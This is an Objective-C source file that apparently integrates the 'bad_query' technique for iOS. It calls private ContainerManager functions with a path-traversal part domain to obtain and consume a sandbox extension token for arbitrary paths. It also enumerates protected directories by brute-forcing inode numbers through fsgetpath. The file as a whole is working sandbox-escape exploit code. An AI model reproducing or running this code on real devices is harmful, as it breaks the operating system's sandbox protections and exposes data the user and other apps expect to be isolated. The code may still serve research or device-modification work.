//
//  BadQueryBridge.m
//  Locus
//
//  Independent Objective-C integration of the query used by
//  https://github.com/forcequitOS/bad_query
//

#import "BadQueryBridge.h"

#import <dlfcn.h>
#import <errno.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <xpc/xpc.h>

static const uint64_t kBadQueryContainerClass = 13;
static const uint64_t kBadQueryPart = 3;
static const uint64_t kBadQueryFlags = 0x0000008000000000ULL;
static NSString * const kBadQueryIdentifier =
    @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kBadQueryTraversalPrefix = @"../../../../../../../..";

typedef void *(*BadQueryCreate)(void);
typedef void (*BadQuerySetU64)(void *, uint64_t);
typedef void (*BadQuerySetXPC)(void *, xpc_object_t);
typedef void (*BadQuerySetCString)(void *, const char *);
typedef void *(*BadQueryGetSingleResult)(void *);
typedef void (*BadQueryFree)(void *);
typedef char *(*BadQueryCopySandboxToken)(void *);
typedef int64_t (*BadQueryConsumeSandboxExtension)(const char *);
typedef int (*BadQueryReleaseSandboxExtension)(int64_t);

typedef struct {
    void *library;
    BadQueryCreate create;
    BadQuerySetU64 setClass;
    BadQuerySetXPC setGroupIdentifiers;
    BadQuerySetU64 setFlags;
    BadQuerySetU64 setPart;
    BadQuerySetCString setPartDomain;
    BadQueryGetSingleResult getSingleResult;
    BadQueryFree freeQuery;
    BadQueryCopySandboxToken copySandboxToken;
    BadQueryConsumeSandboxExtension consumeSandboxExtension;
    BadQueryReleaseSandboxExtension releaseSandboxExtension;
} BadQueryAPI;

static BadQueryAPI *BadQuerySharedAPI(void)
{
    static BadQueryAPI api;
    static dispatch_once_t onceToken;

    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setPartDomain, "container_query_operation_set_part_domain");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD

        api.consumeSandboxExtension = (BadQueryConsumeSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.releaseSandboxExtension = (BadQueryReleaseSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });

    return &api;
}

BOOL BadQueryBridgeAvailable(void)
{
    BadQueryAPI *api = BadQuerySharedAPI();
    return api->library && api->create && api->setClass &&
        api->setGroupIdentifiers && api->setFlags && api->setPart &&
        api->setPartDomain && api->getSingleResult && api->freeQuery &&
        api->copySandboxToken && api->consumeSandboxExtension &&
        api->releaseSandboxExtension;
}

NSArray<NSString *> *
BadQueryListImmediateChildren(NSString *path,
                              uint64_t maxInode,
                              NSString **error)
{
    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query_list requires an absolute path";
        return nil;
    }

    if (maxInode == 0) {
        if (error) *error = @"bad_query_list requires maxInode > 0";
        return nil;
    }

    //
    // Match upstream bad_query_list behavior: fsgetpath commonly returns
    // /private/var/... while callers use /var/..., so normalize the root to
    // /var/... before comparing.
    //
    NSString *normalizedRoot = path;
    if ([normalizedRoot hasPrefix:@"/private/var/"]) {
        NSString *suffix =
            [normalizedRoot substringFromIndex:[@"/private/var/" length]];
        normalizedRoot =
            [@"/var/" stringByAppendingString:suffix];
    }

    struct statfs sfs;
    if (statfs(path.fileSystemRepresentation, &sfs) != 0) {
        if (error) {
            *error = [NSString stringWithFormat:
                @"bad_query_list statfs failed for %@ (errno=%d: %s)",
                path,
                errno,
                strerror(errno)];
        }
        return nil;
    }

    fsid_t fsid = sfs.f_fsid;
    const char *root = normalizedRoot.fileSystemRepresentation;
    size_t rootLength = strlen(root);

    NSMutableOrderedSet<NSString *> *children =
        [NSMutableOrderedSet orderedSet];

    char buffer[1200];

    //
    // This is intentionally the same primitive as forcequitOS/bad_query:
    // walk inode numbers and resolve them with fsgetpath instead of trying
    // to open/enumerate the protected parent directory.
    //
    for (uint64_t inode = 1; inode <= maxInode; inode++) {
        ssize_t length =
            fsgetpath(buffer, sizeof(buffer), &fsid, inode);

        if (length <= 0) {
            continue;
        }

        //
        // fsgetpath returns a C path. Be defensive about termination even
        // though the upstream implementation can use it directly.
        //
        if ((size_t)length < sizeof(buffer)) {
            buffer[length] = '\0';
        } else {
            buffer[sizeof(buffer) - 1] = '\0';
        }

        const char *candidate = buffer;

        //
        // "/private/var/..." -> "/var/..."
        //
        if (strncmp(candidate, "/private/var/", 13) == 0) {
            candidate += 8;
        }

        if (strncmp(candidate, root, rootLength) != 0 ||
            candidate[rootLength] != '/') {
            continue;
        }

        const char *child =
            candidate + rootLength + 1;

        if (*child == '\0') {
            continue;
        }

        //
        // Immediate child only.
        //
        if (strchr(child, '/') != NULL) {
            continue;
        }

        NSString *resolved =
            [NSString stringWithUTF8String:candidate];

        if (resolved.length > 0) {
            [children addObject:resolved];
        }
    }

    if (error) *error = nil;
    return children.array;
}

@interface BadQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation BadQueryLease
{
    int64_t _sandboxHandle;
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query requires an absolute target path";
        return nil;
    }

    if (!BadQueryBridgeAvailable()) {
        if (error) *error = @"bad_query ContainerManager API unavailable";
        return nil;
    }

    BadQueryAPI *api = BadQuerySharedAPI();
    void *query = api->create();

    if (!query) {
        if (error) *error = @"bad_query could not create a container query";
        return nil;
    }

    api->setClass(query, kBadQueryContainerClass);

    xpc_object_t identifier =
        xpc_string_create(kBadQueryIdentifier.UTF8String);

    api->setGroupIdentifiers(query, identifier);

#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif

    api->setPart(query, kBadQueryPart);

    NSString *partDomain =
        [kBadQueryTraversalPrefix stringByAppendingString:path];

    api->setPartDomain(
        query,
        partDomain.fileSystemRepresentation
    );

    api->setFlags(query, kBadQueryFlags);

    void *result = api->getSingleResult(query);

    if (!result) {
        api->freeQuery(query);
        if (error) *error = @"bad_query was rejected by ContainerManager";
        return nil;
    }

    char *token = api->copySandboxToken(result);

    if (!token) {
        api->freeQuery(query);
        if (error) *error = @"bad_query did not receive a sandbox token";
        return nil;
    }

    int64_t handle =
        api->consumeSandboxExtension(token);

    free(token);
    api->freeQuery(query);

    if (handle < 0) {
        if (error) *error = @"bad_query could not consume the sandbox token";
        return nil;
    }

    BadQueryLease *lease =
        [BadQueryLease new];

    lease->_sandboxHandle = handle;
    lease.targetPath = path;
    lease.active = YES;

    if (error) *error = nil;
    return lease;
}

- (void)invalidate
{
    if (!self.active) return;

    BadQuerySharedAPI()->releaseSandboxExtension(
        _sandboxHandle
    );

    _sandboxHandle = -1;
    self.active = NO;
}

- (void)dealloc
{
    [self invalidate];
}

@end
